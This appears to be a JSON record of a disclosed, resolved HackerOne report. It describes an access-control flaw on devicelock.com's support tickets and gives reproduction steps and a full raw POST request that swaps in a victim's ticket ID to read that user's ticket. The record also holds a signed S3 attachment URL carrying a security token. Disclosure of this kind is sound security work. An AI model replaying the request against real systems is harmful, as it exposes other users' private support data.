@@ -1,0 +1,128 @@
+{
+  "id": 1124974,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTI0OTc0",
+  "url": "https://hackerone.com/reports/1124974",
+  "title": "Attacker Can Access to any Ticket Support on https://www.devicelock.com/support/",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-03-13T13:41:01.482Z",
+  "submitted_at": "2021-03-13T13:41:01.714Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "h4x0r_dz",
+    "url": "/h4x0r_dz",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/jn83pnh4ctsyb50riy9iixqzko9k/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13428,
+    "url": "https://hackerone.com/acronis",
+    "handle": "acronis",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Acronis",
+      "twitter_handle": "Acronis",
+      "website": "https://www.acronis.com",
+      "about": "Acronis sets the standard for cyber protection through its backup, anti-ransomware and cyber infrastructure"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-02-08T09:10:02.144Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-01-15T15:07:26.782Z",
+  "team_member_agreed_on_going_public_at": "2022-02-08T09:10:01.985Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nHello team.\n\nI found A security issue on devicelock.com where the attacker can access to any Ticket support and real all the information that The users sent to the support. and this without user interaction.\n\nIn other words: **an attacker can have full access to users Ticket using `Ticket id` only .**\n \n\n\n## Steps To Reproduce\n\nto Reproduce This bug you need to accounts, one for the attacker and the other for the victim.\n\n  1. in the victim account go to https://www.devicelock.com/bitrix/admin/ticket_edit.php?lang=en and add a new ticket. now, this ticket has an **ID** Copy this id.\n  2. go to https://www.devicelock.com/support/ticket_edit.html?ID=0 and put anything on Subject&Message. \nnow make intercept on and click on ***Save***. and change the **Content-Disposition: form-data; name=\"ID\"** value to the victim id ticket .\n\n\n### vulnerable Request : `ID` parameter \n ```\nPOST /support/ticket_edit.html?ID=0 HTTP/1.1\nHost: www.devicelock.com\nConnection: close\nContent-Length: 1505\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: https://www.devicelock.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryEbeDU0DJhrnLl8U7\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://www.devicelock.com/support/ticket_edit.html?ID=38173\nAccept-Encoding: gzip, deflate\nAccept-Language: ar,en-US;q=0.9,en;q=0.8\nCookie: <attacker_Cookie>\n\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"sessid\"\n\n<sessid_attacker>\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"set_default\"\n\nY\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"ID\"\n\n<victim_id>\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"lang\"\n\nen\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"TITLE\"\n\nanything\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"MESSAGE\"\n\nanything\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n3072000\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"FILE_0\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"FILE_1\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"FILE_2\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"files_counter\"\n\n2\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"apply\"\n\nApply\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"apply\"\n\nY\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7--\n\n```\n\nnow in the response, you can see the victim ticket information.\n\n### POC \n\n{F1228906}\n\n## Impact\n\nan attacker can access all user's tickets without user interaction.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1228906,
+      "file_name": "2021-03-13_14-34-03.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/92p3jra0dqz03ck42rb2hbf1rpz9?response-content-disposition=attachment%3B%20filename%3D%222021-03-13_14-34-03.mp4%22%3B%20filename%2A%3DUTF-8%27%272021-03-13_14-34-03.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6K7XUSGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140710Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA5oUTkOsy%2B%2BNZW%2FsEPkxVR9Nn0bKUQajhMaZJnQUOJJAiBNVU4iwU4izaH0MK0tElopJO3KoogTT8%2FbdWX%2FkbKzuyqyBQh2EAMaDDAxMzYxOTI3NDg0OSIMERsjeYIiXpoQB0OmKo8FUViIVri3eJCOgeD2QGMLKPs4F1%2FjbhNffMNUt%2BfvAGSphgvZY2tU246xkvKwwDTX6TnzUNLh3iGOcuouArS3RIWbEfHSiDDu6%2BVZPx3Wz1I%2FCwS%2BKPH5NwJsBp0BibvHEHHji%2FALBDiXO8PioToytjyaEQNaXmQuLAn84CAb4QekxzofZnprn52iHUoXFyJNf%2Fq3ZqvA4jb30mJAxCPIjnPde1tkpNSGuAfsmY%2ByQYlN7sWxpq5yV%2BTU%2Bz0rt1WjtctGsd6w1yt88Dd%2Br74P8m7ROn2Z0ptQw5A%2BWNmX1Wanb7ILpRxe8QeaZaokqgxiSrVfnWtNKgnVUga2Z0moK4hOWv539koLmT4PBBuxJlSyZWyeMoBemGmSCiOxOKwmrf%2BCK%2FG1BpNYsaCmjPVr2A49O9rh48uqEFc8uvejj87y8pQoGWAlFjsxe1QzTC0haaEIYGygiAnZI6IKmy2%2BNlrPwjgcdHQnc15lnYbAokFqg1uW1UzqkUE4c44dN5JbBhzJaJz14CGqvz2LbrkrxeapW3SunevCGGfJdcClV%2F0zJwxxOPm7TYbX7PHfVKaL7pLvGt6ShxVaeJzf1nAj8m2nfGj9L5WdfZ6Sb9aD7w08GXkqVBejxqPrEzu%2Fin49ua4mt8x0hItGe5i0jUq8p%2BuZQ93zKwP09dFgsV6qPlGtXKwW1fddd9jt%2Bnnp1fwfIxbu4spfYa8nFjzgPqH7T%2F%2FJQgaw6dXm%2Fi4%2FblBIP3pX1Sf8fOovW1YithPw4Jt%2FdibdeIaKPPXUhJeeypNj7zindWYEDmbdjQ6xKgYfOTCGv3Kveuz%2BrIe58j5hhTO6SOGM5oLaEPjukGlkwR0S6pSULxstSwXhSCM4K2grCjC%2Fvq2uBjqyASBnlNoKKu8wzQ1P%2F0BlH14PlBBt%2Fm%2BFzSC4hnyN21lioiA3qg372zbcFqxrMin8PkMDjYnDERYVShxZWmk7L62lyLmDmK6ddoZeeuZn0a%2BBvBT61yW5%2Fafe16Wi38LTWHakxXOTJqfqznIB1OO6RKIWbBpba3WDGpf5V64%2B0hKThL7teXpfRzoD3U%2BjQs%2B7q62Fy7YrQ7qeIWla%2FIkEaOKDajC8wFKHIsPw6ZwsIvBIndQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d5faf61a1c6352dfa07abd198e438971c4d47ce13252c8b2fdc2cea2a468043a",
+      "file_size": 8521518,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 98,
+  "voters": [
+    "napkin",
+    "pinkmeimei",
+    "shreyaschavhan",
+    "mr-medi",
+    "x7q",
+    "testt0",
+    "theelgo64",
+    "shuvam321",
+    "alp",
+    "ertugrul",
+    "and 88 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 63087,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.devicelock.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
